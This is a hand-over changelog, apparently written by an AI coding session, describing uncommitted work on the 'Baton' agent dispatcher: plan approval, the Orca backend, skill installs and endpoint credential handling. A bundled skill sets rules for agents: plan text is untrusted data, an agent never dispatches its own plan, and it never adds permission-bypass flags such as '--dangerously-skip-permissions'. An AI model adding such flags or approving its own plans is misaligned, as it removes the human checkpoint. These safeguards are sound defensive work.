# Changes made from the Orcabaton session

**Who wrote this:** the Claude Code session working in `../orcabaton/`, not the
session that owns this repo.

**What to do with it:** review, then commit or drop them — they are yours to
decide on. I do not commit and never push this repo; that boundary exists so two
sessions cannot overwrite each other's history. Everything below is sitting in
the working tree.

Companion to [`CONTRACT-orcabaton-desktop.md`](./CONTRACT-orcabaton-desktop.md),
which describes the same boundary from the other direction.

**Append to this file in the same turn as the code change, never afterwards.**

---

## Already committed by me (before this rule existed)

| Commit | What |
|---|---|
| `8b13923` | P2 — the executor seam: `types.ts`, `capability.ts`, `config.ts`, `select.ts`, `runs.ts` + 6 test files |
| `1cadf7d` | Routed `baton start` through that seam, printing the identical line |

Both on `feat/plan-dispatch`, local only — never pushed.

---

## 2026-08-22 — P3, the dispatcher (uncommitted)

`baton dispatch <plan>` on an approved plan claims each task, installs its
skills into its own worktree, writes its brief, and launches the assigned agent.
`baton plan approve <plan>` is the gate in front of it.

Verified: `npx vitest run` → **159 files, 1914 tests, 0 failures**;
`npx tsc --noEmit` → exit 0; plus a real dispatch in a scratch repo where an
agent read its brief, committed work and called `baton done`.

### New files — mine entirely, nothing of yours in them

| File | Role |
|---|---|
| `src/dispatch.ts` | `planDispatch` — the whole decision, pure. No fs, git or clock |
| `src/dispatch-run.ts` | claim → skills → brief → launch → record, every seam injected |
| `src/plan-trust.ts` | the approval gate: `.baton/trusted-plans.json`, digest-checked |
| `src/commands/dispatch.ts` | `baton dispatch` + `baton plan approve` |
| `test/dispatch-plan.test.ts` | 26 tests — precedence, capacity, barrier, every refusal code |
| `test/dispatch-run.test.ts` | 24 tests — ordering, release-on-failure, dry run |
| `test/dispatch-identity.test.ts` | 3 tests — a dispatched agent is never told it was adopted |
| `test/dispatch-brief.test.ts` | 7 tests — the contract section and its drop order |
| `test/plan-trust.test.ts` | 21 tests — digest, fail-closed trust file, author warning |

### Existing files I touched, and exactly what I added

| File | My change | Why it could not live elsewhere |
|---|---|---|
| `src/plan.ts` | `PlanTask.model?` + a `**model:**` field with a strict grammar | Plans own intent; the runs ledger owns fact |
| `src/plan-apply.ts` | `'model'` in `OWNED`, written unconditionally in `merged` | Without that, a model the plan dropped survives on the row |
| `src/pipeline.ts` | `PipelineFields.model?` | Same field, read side |
| `src/lifecycle.ts` | `claim(..., { override })` — 6th param, defaults false | `--agent` must outrank the plan's `@agent` (P3-E12). Waives the assignee rule **only**; barrier, deps and state check all still apply |
| `src/commands/claim.ts` | `claimTask(..., { override })` passes it through | Same |
| `src/commands/plan.ts` | `readPlanFile` exported (was module-private) | `commands/dispatch.ts` reads plans the same way |
| `src/mcp-pipeline.ts` | private `brief()` → exported `taskContract()`, 3 call sites renamed | The dispatched brief and `my_tasks` must not disagree about what a task is |
| `src/skills/install.ts` | `isSkillAgent` exported | Dispatch reports an unsupported agent as a note, not a failure |
| `src/executors/config.ts` | new `loadExecutorConfig(root)` | Nothing read the `executor` block off disk yet |
| `src/events.ts` | `dispatch.started` added to `BatonEvent` | One new union member |
| `src/cli.ts` | registers `dispatch` and `plan approve` | |

### Two files where my hunks sit beside yours

Both also carry work from the **21 Aug 22:30** batch (the untrusted-fence and
prompt-composition work). Mine are separable:

**`src/handoff/brief.ts`** — mine are only:
- `contractSectionMd()` (exported, right after `graphSectionMd`)
- two optional opts on `buildBrief`: `contract?` and `orientation?`
- two `push(...)` calls: the contract at `dropOrder: 0`, orientation at `3`

It uses your `fenceUntrusted` — the plan's scope/expects/principles are quoted
rather than restated in Baton's voice.

**`src/spawn.ts`** — mine is only `waitForAgent`, which now returns
`AgentExit | null` instead of `void` (plus the exported `AgentExit` type). Your
`composeTaskPrompt` work is untouched.

**`test/plan.test.ts`, `test/plan-apply.test.ts`, `test/lifecycle.test.ts`** —
appended blocks at the end of each; nothing edited above them.

### Three bugs this found in existing code

Worth reading even if you drop the rest — the first is not P3-specific.

1. **A one-shot command that launches a headless agent kills it on exit.**
   `armExitCleanup` arms `process.once('exit')` → `killTree(SIGKILL)` for every
   run in `running`. Correct for `baton start`, which awaits `waitForAgent`.
   Fatal for anything that launches and returns: my first dispatch claimed the
   tasks, wrote the briefs, printed `1 started`, exited, and killed the agent.
   Fixed by making `dispatch` supervise to the end the way `baton start` does —
   but any future launch-and-return caller hits the same wall. A `disown` option
   on `startAgent` may be worth having.

2. **`claim()` had no way to express an operator override.** The dispatcher
   picked the `--agent` agent and `claim` refused because the row still named
   the plan's, so the operator was told their own override was not allowed.

3. **An author check compared a git *email* against a git *name*.** The P3-E2
   warning ("this plan's last commit is not yours") fired on plans the user had
   written themselves. It now checks both identities git records.

### Deliberately not done

`--backend orca` refuses with "not built yet" rather than quietly running local.
A plan assigned to `@antigravity` only launches under Orca, and substituting the
local backend would turn that into a refusal nobody could explain. That is P4.

---

## 2026-08-22 — the manual relay, and an agent-detection bug (uncommitted)

### The relay

When Baton has no launcher for an assignee, the refusal now becomes an
instruction a person can act on:

```
  ⇢ 1 task needs you to start the agent — Baton has no launcher for it:

    auth-docs → antigravity
      why:  'antigravity' has no launcher in the local backend
      open: antigravity's own terminal, opened in this repo
      run:  baton take auth-docs
```

Nothing is claimed and nothing is written — `baton take` already builds the
worktree, claims as whoever runs it, and prints the objective, scope and
expects. The instruction just connects the two.

| File | Change |
|---|---|
| `src/dispatch.ts` | `relayFor(refusals)` + `RelayInstruction` at the end of the file |
| `src/commands/dispatch.ts` | `printRelay`; a relayed task prints once, as work to do, not twice |
| `test/dispatch-relay.test.ts` | 9 tests — which refusal codes relay, and which do not |

Only `no-mode` and `no-prompt` relay. `not-installed` deliberately does not:
nobody can start a CLI that is not there, so "open it" is advice that fails at
the first step.

### The bug it found: `antigravity`'s detect pattern was unanchored

`/(^|\/|\s)agy(\s|$)|antigravity/i` — the second alternative had **no anchors**,
so any command line merely CONTAINING the word was identified as that agent.
Every sibling pattern is anchored; this one was the outlier.

It is not theoretical. `resolveAgentId()` reads the process table when
`BATON_AGENT` is unset, and the answer is matched against a task's `assignee` —
so a shell whose command line happened to contain `@antigravity` could claim
every task assigned to the real agent. That is how I found it: `baton take` on
an `@antigravity` task succeeded from an ordinary shell and recorded
`claimedBy.agent = "antigravity"`.

| File | Change |
|---|---|
| `src/agents/registry.ts` | `detect: /(^\|[/\s])(agy\|antigravity)([\s/.]\|$)/i` — both alternatives anchored, `.` allowed after so `Antigravity.app/…` still resolves |
| `src/agents.ts` | `firstAgentIn`'s loose fallback pass now bounds the id at **both** ends. Unbounded, `/x/aider-notes/index.js` resolved as the aider agent |
| `test/agent-detect-anchoring.test.ts` | 5 tests — the CLI and the `.app` bundle still detect; a script or directory that mentions the name does not |

Verified: `npx vitest run` → **161 files, 1928 tests, 0 failures**; `tsc` exit 0.
Then, in a scratch repo, from a shell whose command line does not contain the
word: `baton take auth-docs` → `✗ 'auth-docs' is assigned to antigravity`, and
with `BATON_AGENT=antigravity` → `✓ claimed auth-docs` with its scope and
expects. Both halves of the printed instruction are true.

**If you take only one thing from this file, take the detection fix.** It is
three lines and it affects every claim, not just dispatched ones.

---

## 2026-08-22 — a parallel roadmap plan, and a plan-validator false positive (uncommitted)

### `baton/plans/roadmap-parallel.md` (new)

The eight Baton roadmap phases with no unmet dependency, plus the two that
follow from them, written as one phase with `after:` for real ordering. Passes
`baton plan check` — 10 tasks, 1 phase. Nothing in it is assigned: routing picks
per task from the installed roster, so the split appears by itself as more
agents are installed.

It includes `skill-git-exclude`, the one-call fix for the Q22 defect — P30's
Done-when says an installed skill "is git-excluded" and it is not, so every
dispatched agent can commit its own skill directory.

### The validator fix that plan needed

`plan check` refused it: `graph-extractor` and `grammar-packaging` "run in
parallel over the same files". They cannot — `grammar-packaging` carries
`after: graph-extractor`, and `eligibleFor` will not start it until the other
is done. The scope-overlap check grouped by phase and never read `dependsOn`.

The advice it gave was the worse half: *"move one to another phase"* pushes a
plan toward a coarse barrier that stops every unrelated task too, when the
precise dependency was already written down. That is the opposite of what makes
a plan parallel.

| File | Change |
|---|---|
| `src/plan.ts` | new `orderedPairs(tasks)`; the overlap loop skips any pair where one task transitively waits for the other |
| `test/plan.test.ts` | 4 tests appended — direct edge, transitive chain, and the two cases that must still refuse |

The transitive case matters and was the bug in my first attempt: `a → b → c`
orders `a` before `c` just as firmly as a direct edge, and the recursion has to
carry the task it started from rather than the immediate child.

Still refused, correctly: two tasks that both depend on a third overlap for
real, because the shared dependency does not order them relative to each other.

Verified: `npx vitest run test/plan.test.ts` → 53 passed; `tsc` exit 0;
`baton plan check roadmap-parallel` → ✓ 10 tasks across 1 phase.

---

## 2026-08-22 — P4, the Orca backend (uncommitted)

`@antigravity` now launches. That was the phase's whole point: Baton has no
spawn args for it and refuses to guess, and Orca knows how to start thirty
agents including that one.

### The gate, settled before any code

P4's spec opens with a 10-minute spike: does a **Baton-created** worktree, which
Orca never made, resolve through a `path:` selector? Answered by reading Orca's
source rather than by running it.

`resolveWorktreeSelector` (`orca-runtime.ts:31219`) filters the resolved
worktree list, and that list comes from `provider.listWorktrees(repo.path)` — a
real scan whose own comment says it exists to catch *"worktree changes made
outside Orca"*.

**So `path:` works, conditional on the repo being registered.** Unregistered,
the list is empty and the answer is `selector_not_found`. That is why `launch`
checks `repo list` first: it turns P4-E1 from a confusing failure after a
terminal already exists into a refusal that names `orca repo add` and leaves
nothing behind.

### Files

| File | Role |
|---|---|
| `src/executors/orca-cli.ts` | Pure argv + envelope parsing. 17 tests |
| `src/executors/orca-agents.ts` | Snapshot of Orca's agent set and model support. 11 tests |
| `src/executors/orca.ts` | The `Executor`: create → wait → send, observe, stop, reattach |
| `src/executors/orca-probe.ts` | The three questions `select.ts` asks before choosing the backend |
| `test/fixtures/fake-orca.mjs` | Scripted binary — prints real envelopes, records calls and env |
| `test/orca-executor.test.ts` | 16 tests against that fixture |
| `src/commands/dispatch.ts` | Real backend resolution replaces the "not built yet" refusal |
| `src/spawn.ts` | `redactLine` exported (one word) so there is one definition of it |

### Two numbers in the spec were already stale

Read out of `../orcabaton/src/shared/` rather than trusted:

- **30 agents, not 36** (`tui-agent-config.ts`). All eight Baton built-ins are
  present, so `batonToOrca` is genuinely the identity function.
- **Five agents accept a model, not four** (`agent-session-option-catalog.ts`
  registers claude, codex, gemini, cursor **and grok**). Writing the spec's four
  would have refused a model on grok that Orca honours.

Both are why `orcaAgentDrift` exists: `baton doctor` reports a stale snapshot
rather than a dispatch failing because the list aged (P4-E5).

### Edge cases

| # | Handling |
|---|---|
| P4-E1 | `repo list` is checked before creating anything; the refusal names `orca repo add` |
| P4-E2 | `reattach` returns `null` on `terminal_handle_stale` **and** when Orca cannot be reached — the run is lost, not running |
| P4-E3 | `orca-ide` on Linux, where bare `orca` is the GNOME screen reader; `ORCA_CLI_COMMAND` outranks both |
| P4-E4 | A wait that times out sends nothing **and closes the terminal** — an orphan TUI attached to a released claim is the visible half of "looks busy and isn't" |
| P4-E5 | `orcaAgentDrift(live)` reports both directions and never throws |
| P4-E6 | All parsing is in `orca-cli.ts` behind fixture tests, so drift is a test failure |
| P4-E7 | `observe` redacts through the same `detectSecret` local runs use |
| P4-E8 | `--backend orca` when it cannot be used refuses with the reason; `auto` never picks it |

Plus the env fence on **every** call, asserted by the fixture recording which of
`ORCA_TERMINAL_HANDLE` / `ORCA_PANE_KEY` / `ORCA_AGENT_LAUNCH_TOKEN` survived.

### One truth fix in dispatch

After an Orca launch, `dispatch` used to print "watching 1 agent(s) — Ctrl+C
stops them". Orca owns those processes and they outlive the command; Ctrl+C
stops nothing. It now says they are running in Orca and that `baton status`
tracks the tasks.

### Verified

```
npx vitest run     → 164 files, 1976 tests, 0 failures
npx tsc --noEmit   → exit 0

# scratch repo, a scripted `orca` on PATH, executor.backend = "orca"
baton plan approve anti  → ▶ auth-docs → antigravity · interactive · via plan
baton dispatch anti      → ▶ auth-docs → antigravity
                           1 agent(s) are running in Orca

calls orca received: status, repo list, terminal create, terminal wait, terminal send
env fence: clean on every one
terminal create --worktree path:<repo>/.baton/wt/auth-docs --command antigravity --title baton:auth-docs
```

### Known, not fixed

`repo list` runs three times per dispatch — once in the probe, once in
`repoRegistered`, and once more through `select.ts`'s cache boundary. Harmless
(each is a fast local call) but worth collapsing behind one cached lookup.

---

## 2026-08-22 — P5, the bundled dispatch skill (uncommitted)

`src/skills/bundled/dispatch-plan/SKILL.md` — teaches an agent to write a Baton
plan and hand it to a human, plus the two entries it needs in
`src/skills/catalog.ts` (`BUNDLED_META` and `SKILL_EXPLAIN`).

Installs into all three `SKILL_AGENTS`, verified against a real repo:

```
✓ installed dispatch-plan into 3 agents:
  • claude       — .claude/skills/dispatch-plan/SKILL.md
  • cursor       — .cursor/rules/dispatch-plan.mdc
  • antigravity  — .agents/skills/dispatch-plan/SKILL.md
```

### What it teaches, and the one rule

The plan grammar (`### <slug> @agent`, `**scope:**`, `**expects:**`,
`**principles:**`, `**skills:**`, `**model:**`, `**after:**`), the ritual
`check → apply → approve → dry-run → dispatch`, the precedence rules, and how to
read each refusal code.

The hard rule is that **the agent never dispatches a plan it wrote**. It writes
it, validates it, shows it, and stops. `dispatch` starts real processes against
the user's own keys, and the plan is a file that can arrive by `git pull` — an
agent that approves its own plan has removed the only human checkpoint in the
system.

Two things it is explicit about because they are easy to erode:

- **Plan text is data.** It reaches an agent quoted, never in Baton's voice.
- **Baton never adds permission-bypass flags** — no
  `--dangerously-skip-permissions`, no auto-approve — and the skill tells the
  reading agent not to add them or suggest them either. The boundary is the
  worktree plus the user's own CLI defaults.

It also states plainly that a refusal is information: *"a plan where two tasks
refuse and four start is a plan that is working."*

### `test/dispatch-skill.test.ts` — 12 tests

Deliberately does not test prose. It tests the safety rules that must never be
edited away (never-dispatch, prose-is-data, never-add-flags), that the ritual's
order survives inside its command block, that every refusal code and every plan
field the parser accepts is documented, and that the skill renders for all three
agents.

The ordering test reads the **command block**, not the document: the hard rule
above it names `plan approve` first on purpose, and a first-occurrence check read
that as the ritual being out of order. Fixing the test rather than reordering the
prose was the right way round — the rule belongs before the recipe.

Verified: `npx vitest run` → **165 files, 1988 tests, 0 failures**; `tsc` exit 0;
`baton skills install dispatch-plan` lands in all three, and the hard rule
survives all three renderings.

**The dispatch track (P1–P5) is now complete.**

---

## 2026-08-22 — P10's daemon half: approving and dispatching over HTTP (uncommitted)

The phone reaches these through Orca's relay, which forwards from the desktop,
so from Baton's side the caller is loopback. What travels over the wire is the
gate itself.

### New routes in `src/server.ts`

| Route | Notes |
|---|---|
| `GET /api/pipeline/plans` | Every plan on disk, with whether it is approved *as it now stands* |
| `GET /api/pipeline/plans/:id` | **Extended, not replaced.** Now also returns `sha256`, `approved`, `approvedBy`; `?resolve=1` adds the resolved launches and refusals |
| `POST /api/pipeline/plans/:id/approve` | Body `{ sha256 }`. Mismatch ⇒ 409 with the real digest; missing ⇒ 400; idempotent on `{planId, sha256}` |
| `POST /api/dispatch` | Requires approval. Returns `started`, `failed` **and** `refusals` |

The existing plan-document route was extended rather than shadowed — my first
version added a second route for the same path and the older one won, silently.
The digest is always included (it is a hash of bytes already in hand); the
resolved decision is behind `?resolve=1`, because working it out probes the
executor and reads the whole board, and the dashboard reads that route only to
render markdown.

### `src/executors/dispatch-resolve.ts` (new)

`resolvePlanDispatch(root, file, opts)` and `dispatchDeps(root, executor)`,
carved out of `commands/dispatch.ts`. The daemon and the CLI now share one
definition, which is what makes the approval gate meaningful: the phone approves
what the CLI would launch, not a second implementation that can drift. The
command keeps only its printing.

### Edge cases

| # | Handling |
|---|---|
| P10-E1 | Approve carries the sha256 the caller read; a mismatch is a 409 that names the real digest so the phone can re-fetch |
| P10-E2 | Same path — a plan that changed between render and tap fails the same check |
| P10-E3 | Idempotent on `{planId, sha256}`. A retry returns `alreadyApproved: true` with the **original** `at`; re-stamping would record a human approving twice |
| P10-E4 | Both writes gated on `writeEnabled` and `requiresOwner`. Reads stay open — read-only is not "no information", and the point of the screen is to see what would run |
| P10-E5 | The dispatch response carries launches **and** refusals |

Plus a traversal guard: a plan id is matched against
`/^[A-Za-z0-9][A-Za-z0-9._-]{0,80}$/` before it becomes a path.

`test/plan-approve-api.test.ts` — 14 tests against real daemons on two ports
(read-write and read-only), in the style of `pipeline-api.test.ts`.

Verified: `npx vitest run` → **166 files, 2002 tests, 0 failures**; `tsc` exit 0.

---

## Q21 — browsing the knowledge graph without downloading it · 2026-08-22

**Why this is Baton work.** Orcabaton's knowledge panel has been *refusing* to
open the graph since P29, and refusing correctly: `/api/kb/graph` streams
`graphify-out/graph.json` whole, this repo's is **144,502,085 bytes**, and the
Orca client caps a read at 8 MB. The panel printed the size and stopped. That
was honest and it was a dead end, because Baton had no endpoint that answers a
*question about* the graph — only one that ships the whole thing.

### `src/kb/neighbours.ts` (new)

Two queries, both read-only:

- `?node=<id>` — a symbol's neighbours, each with its relation and which way
  the edge points.
- `?file=<path>` — the symbols a file defines, so a reader can pick one.

The graph is 98,266 nodes and 286,680 links; the 144 MB is mostly
pretty-printing. Parsing that per request would make an interactive panel
unusable, so the derived index is cached and **keyed on the graph file's mtime
and size** — a `baton kb rebuild` invalidates it with nobody having to remember.

Measured on this repo's real graph: **464 ms** cold, **4 ms** warm, one parse.

**It also lets go.** 328 MB peak while parsing, **94 MB retained** after
(measured under `--expose-gc`). A daemon holding 94 MB for a panel somebody
closed an hour ago is not acceptable, so the index is dropped after
`NEIGHBOURS_IDLE_EVICT_MS` (5 minutes) idle, on an `unref()`'d timer so it can
never be the reason the process stays alive. `evictIdleNeighbourIndex(now)` is
exported so a test does not have to wait five minutes to prove it.

Adjacency stores **ids only**, with metadata looked up from the node map — a
symbol with 3,161 edges must not be 3,161 copies of its neighbours.

### Edge cases

| # | Case | Handling |
|---|---|---|
| N-E1 | Graph never built | `not-built`, carrying `baton kb rebuild` |
| N-E2 | Unknown symbol id | `unknown-node`. **Never an empty neighbour list** — that would claim the symbol is isolated, and a symbol the graph does not contain supports no claim at all |
| N-E3 | Hub symbol | Capped, with `total` and `withheld` reported. `translate()` in the Orcabaton graph has **3,161** edges; a silent 50 would present a fiftieth of a neighbourhood as the whole of it |
| N-E4 | Rebuild while a panel is open | mtime+size key; the stale index is never served |
| N-E5 | File not in the graph | `file-not-indexed`, distinct from a file with no symbols — only one of them is a reason to rebuild |
| N-E6 | Neither selector given | `needs-selector` → **400**, because that is the caller's mistake, not a missing thing |
| N-E7 | Genuinely isolated symbol | `ok` with zero neighbours. A real answer, not a refusal |

Neighbours are degree-ranked — the same notion of importance `extractGodNodes`
already uses — then codepoint-ordered, so the answer is identical on every
machine.

### `src/server.ts`

One route: `GET /api/kb/neighbours`. Project resolution copies `/api/kb/graph`'s
(`?project=`, else merged, else the first project). Refusals keep their own
status: `needs-selector` is 400, everything else 404, and the body always
carries `code` so a client can tell them apart.

**One bug the tests caught before it shipped:** `Number(url.searchParams.get('limit'))`
is `0` when the parameter is absent — `Number(null)` is 0, not NaN — which
silently capped every answer at one row. The absent case is now checked before
the conversion.

### Tests

`test/kb-neighbours.test.ts` (14) and `test/kb-neighbours-api.test.ts` (7,
against a real daemon).

Verified: `npx vitest run` → **2023 tests, 0 failures**; `npx tsc --noEmit` exit 0.

### For the Baton session

Worth considering, not done here:

1. **The index is per-process and global**, keyed by one graph path. A hub
   daemon serving several projects will thrash between them. A small LRU keyed
   by graph path would fix it; one entry was enough for the single-project case
   and I did not want to guess at hub usage.
2. **`/api/kb/graph` is now the slow path for a job nothing needs.** Once a
   client can query, streaming 144 MB is only useful for an offline export —
   which `/api/kb/export` already does properly.
3. **A `relation` filter** (`?relation=calls`) would make a hub navigable
   without paging: 3,161 edges is mostly `imports`, and the interesting ones are
   `calls`.

### `baton/plans/roadmap-parallel.md` (rewritten, 2026-08-22)

Two tasks removed because they shipped (`orca-backend` P4, `dispatch-skill` P5),
and three added: `launch-injection` (P16) and `model-catalog` (P17) chained
behind `model-endpoints` with `after:`, plus `neighbours-index-per-project` for
the hub limitation noted above.

The header now says the thing that changed on 2026-08-22: **the Orcabaton repo
has one startable task left**, so the project's critical path runs entirely
through this repo, and the longest chain in it is
`model-endpoints → launch-injection → model-catalog`. If one agent is working,
that is where it should start. `skill-git-exclude` remains the cheapest task on
the list and it closes a phase in the other repo.

`baton plan check roadmap-parallel` → 11 tasks across 1 phase.

---

## Q22 — an installed skill no longer becomes the agent's diff · 2026-08-22

From the Orcabaton progress log. P30's Done-when says an install "lands in the
worktree and is git-excluded"; **neither half was true**.

This is not tidiness. Baton writes the skill into the worktree it hands an
agent, and every untracked file there lands in `worktreeStatus().changedFiles`,
which `baton done` passes to the evidence gate as `dirtyFiles`, where a single
entry is a hard refusal. Un-excluded, Baton made the task it had just briefed
impossible to finish — or the agent committed Baton's own scaffolding with its
work.

### Clause 1 — exclude what you write

`installSkill` now git-excludes everything it wrote, and `uninstallSkill` takes
the patterns back out.

**Why inside `installSkill` rather than at each call site:** `dispatch-resolve.ts`
remembered to call `gitExcludeLocal`; the CLI and the HTTP route did not. An
invariant every caller has to remember is one callers will forget. That call
site is now gone — `installSkill` owns it.

**And it excluded the wrong thing.** The dispatch path passed `res.rel`, which
names `SKILL.md`, while `installSkill` also writes a `references/` directory
beside it. `SkillTarget` now carries an `excludes: string[]` of everything an
install produces — the skill *directory* for claude and antigravity, and for
cursor **two** patterns, because its references live in a sibling `<id>/` folder
next to the `.mdc` rule.

`uninstallSkill` removes them again. A pattern that outlives what it was for
makes a hand-written file at the same path invisible to git, and invisible is
the one failure nobody debugs — `git status` simply does not mention it.

**Root-cause fix in `gitExcludeLocal`, which every caller gets:** git exclude
patterns are posix-separated on every platform, but callers build `rel` with
`path.join`, which yields backslashes on Windows, and a backslashed pattern
silently matches nothing. It now normalises. That was a live cross-platform bug
in `brief.ts` and `snapshot.ts` too.

It returns `boolean` now — false outside a git repo, which is the folder-
workspace case and not a failure.

### Clause 2 — land in the worktree you were told

`POST /api/skills/:id/install` accepted no worktree, so it installed into the
daemon's root. One daemon serves a repo, agents work in worktrees under it, and
Orca can have a worktree open that is not the main checkout — so "install this
skill" from that window wrote where the reader was not looking.

`resolveSkillRoot(servedRoot, requested, worktrees)` honours a requested path
**only when `git worktree list` names it**, and refuses everything else. The
path arrives over HTTP and decides where files are written, so it fails closed;
the refusal names the worktrees it would have accepted.

Comparison is `resolve()`d and case-folded on win32. Two checkouts differing
only by a symlink (macOS `/var` → `/private/var`) will not match and the install
is refused — a refusal is an inconvenience, a write outside the repo is not.

**The read and the write treat a bad path differently, on purpose.** `GET
/api/skills` falls back to the served root and reports which root it used, so a
client naming a directory that is not itself a worktree does not blank the
panel. The write refuses. A test pins that `resolveSkillRoot` itself never
returns a fallback: leniency belongs to the caller, or the write would silently
install somewhere other than where it was told.

### Version skew — the daemon says what it did

An Orca panel updates separately from the Baton it talks to, and that panel
warns about untracked files **before** anyone presses install. So:

- `InstallResult.excluded: boolean` — what actually happened.
- `GET /api/skills` advertises `excludesInstalls`, and `root`.

An older daemon omits both, and absent reads as `false`. Warning about files
that turn out to be excluded is a small annoyance; staying silent about files
that then appear in `git status` is the confusion the notice exists to prevent.

### Verified live, not only in tests

A scratch repo, a real daemon, install over HTTP for all three agents:

```
claude      -> .claude/skills/lean-code/SKILL.md       refs 1   excluded true
cursor      -> .cursor/rules/lean-code.mdc             refs 1   excluded true
antigravity -> .agents/skills/lean-code/SKILL.md       refs 1   excluded true

9 files on disk · git status: 0 skill entries untracked
.git/info/exclude:  /.claude/skills/lean-code
                    /.cursor/rules/lean-code.mdc
                    /.cursor/rules/lean-code
                    /.agents/skills/lean-code
```

Then `git worktree add`, and an install naming it:

```
POST {"agent":"claude","worktree":".../q22repo/.baton/wt/feat"}
  -> landed in the worktree · root checkout untouched · 0 untracked

POST {"agent":"claude","worktree":"/etc"}
  -> HTTP 400  "'/etc' is not a worktree of this repo. Known worktrees: …"
```

Uninstall removed both the files and the patterns, leaving unrelated lines in
`.git/info/exclude` alone.

### Tests

`test/skill-git-exclude.test.ts` (9) and `test/skill-worktree-scope.test.ts` (8).

Verified: `npx vitest run` → **2030+ tests, 0 failures**; `npx tsc --noEmit` exit 0.

---

## P15 — Endpoints + per-agent reach (2026-08-22)

The data model for self-hosted models. No behaviour change yet: this phase makes
the truth representable, and P16 acts on it.

### New — `src/endpoints/`

| File | What |
|---|---|
| `config.ts` | The `endpoints` block of `baton.config.json`, validated on its own. `validateEndpointsConfig(raw, env)`, `loadEndpointsConfig(root)`, `endpointForModel`, `shadowedModels` |
| `reach.ts` | `endpointVia` per agent — the researched table — plus `reachesKind` and `agentsReachingKind` |
| `doctor-report.ts` | `endpointDoctorLines(config, errors)` — the section `baton doctor` prints |

### Changed — three lines

- `src/executors/types.ts` — `AgentCapability.endpointVia`
- `src/executors/local.ts`, `src/executors/orca-agents.ts` — populate it. A vendor
  property, so it is the same on both backends: routing through Orca does not
  make Antigravity reachable by your gateway.
- `src/commands/doctor.ts` — one `await printEndpoints(root)` and its helper.

### The two refusals that are not typo handling

**A literal credential never loads.** `baton.config.json` is committed in some
repos, so a key that loads is a key in a diff, in a brief, and in a log. Refused
in three places — a `key`/`apiKey`/`token`/`secret`/`password` field, credentials
in the URL (userinfo or `?api_key=`), and a key written into `keyRef` itself. The
error names the *field*, never the value.

**A `keyRef` that resolves to nothing leaves the endpoint unusable**, with the
reason, rather than falling through to an unauthenticated call — a gateway that
answers without a key is one anyone on the network can bill you on. Only `env:`
resolves today; `keychain:` is recognised so it gets an honest "not yet" instead
of being mistaken for a literal key.

Precedence is **declaration order and nothing else**. An unusable endpoint
declared first still wins, and P16 refuses with its reason: reordering because a
key failed to resolve would make which server runs your code depend on the shell
the daemon happened to start in. All-digit endpoint names are refused, because JS
enumerates them first and declaration order is the whole rule.

### The reach table is researched truth, not a stub

`null` for cursor, antigravity and gemini is the answer their vendors give, and a
test pins it so a future reader does not "fix" it. `native-model-string` maps to
Ollama only: aider's `--openai-api-base` would plausibly reach an OpenAI-dialect
gateway, but nobody has run it, and an unverified flag fails as a confusing agent
error rather than as a refusal that names the problem. A test also fails if a new
registry agent arrives unclassified.

### Verified live

`baton doctor` in a scratch repo, three endpoints, one key exported:

```
  ✓ fleet — anthropic-compatible  https://gw.corp.internal:4000
      models: kimi-k2, qwen3-coder, glm-4.6
      key: env:BATON_FLEET_KEY (resolved)
      reachable by: claude
  ✗ spare — openai-compatible  https://spare.corp.internal/v1
      ⚠ unusable: BATON_SPARE_KEY is not set in this environment
      reachable by: codex
  ✓ workstation — ollama  http://127.0.0.1:11434
      reachable by: aider, opencode
  ⚠ kimi-k2 is served by fleet and spare — fleet wins (declared first)
  · cursor, gemini, antigravity, openclaw stay on their vendors' models
```

And with four deliberately poisoned endpoints:

```
  ✓ good — ollama … (the one clean endpoint still loads)
  ✗ endpoints.leaky.key: a literal credential — use "keyRef": "env:NAME" instead
  ✗ endpoints.inurl.url: carries a credential — use "keyRef" instead
  ✗ endpoints.typo.kind: expected anthropic-compatible, openai-compatible or ollama
  ✗ endpoints.written.keyRef: expected a reference like "env:NAME", not a key

executor backend still: orca | errors: 0        <- P15-E1
grep -c 'sk-live\|hunter2' over the whole output: 0
```

### Tests

`test/endpoints-config.test.ts` (31) and `test/endpoints-reach.test.ts` (10).

Verified: `npx vitest run` → **172 files, 2080 tests, 0 failures**;
`npx tsc --noEmit` exit 0; `npm run build` clean.

### The plan file, too

`baton/plans/roadmap-parallel.md` — `model-endpoints` removed (the convention
here: a shipped task leaves the plan and is named in the header), `after:
model-endpoints` dropped from `launch-injection`, and every `src/models/**`
scope corrected to `src/endpoints/**` — the guessed path was never the one
PLAN.md specified, and `src/routing.ts` was never touched. The header's claim
that Orcabaton still had one startable task was stale; that plan was deleted.

```
baton plan check roadmap-parallel
✓ roadmap-parallel — 9 tasks across 1 phase
  phase 1: launch-injection, model-catalog, graph-extractor, grammar-packaging,
           kb-sync, incident-reporting, supervisor-role, fleet-enrollment,
           neighbours-index-per-project
```

---

## P16 — Launch injection, refusal, cost safety (2026-08-22)

Where P15's data model starts changing what runs — and where the bill is
protected.

### New — `src/endpoints/`

| File | What |
|---|---|
| `launch-env.ts` | Pure: endpoint + the agent's `endpointVia` → the env for ONE launch. Touches no file, ever |
| `health.ts` | `probeEndpoint` — `ok` / `unreachable` / `unauthorized`, 30s TTL so a dispatch round asks once, not once per queued task |
| `live-endpoints.ts` | The one place that turns config + probes into what `route`, `pass` and `dispatch` read, so three commands cannot disagree about whether the gateway is up |

### Changed

`executors/capability.ts` (three refusal codes), `routing.ts` (the cost rule),
`dispatch.ts` + `executors/dispatch-resolve.ts` (per-tier policy, per-model
endpoint), `spawn.ts` and `terminals.ts` (the two launchers), `memory.ts`
(runtime secret registration), `commands/route.ts`, `commands/pass.ts`,
`commands/dispatch.ts`, `cli.ts` (`--allow-paid-fallback`).

### Step 1 — per-launch env, and one deviation from the plan

`anthropic-base-url` → `ANTHROPIC_BASE_URL` + the auth var (`ANTHROPIC_API_KEY`
by default, or the endpoint's own `authEnv`). `openai-base-url` → both
`OPENAI_BASE_URL` and `OPENAI_API_BASE`, because CLIs disagree about which they
read and setting one alone fails as a confusing auth error against the vendor.

**The plan's table says `native-model-string` injects nothing.** It now injects
`OLLAMA_API_BASE`. The plan's reasoning — "the model string already carries it"
— is true of the *provider* and not of the *host*: `ollama/qwen3-coder` says
nothing about which machine, so an Ollama box on another host would be silently
talked past in favour of localhost. That is the wrong-server failure the rest of
this phase exists to prevent.

Half an injection is worse than none, so an endpoint whose key did not resolve
injects **nothing at all** — not even the base URL. A base URL with no
credential is a call to your gateway that anyone on the network could have made.

**Interactive launches carry a base URL but never a credential.** tmux turns
every variable into a shell `NAME=value` prefix on the agent's own command line,
where `ps` shows it to everyone on the machine for as long as the agent runs.
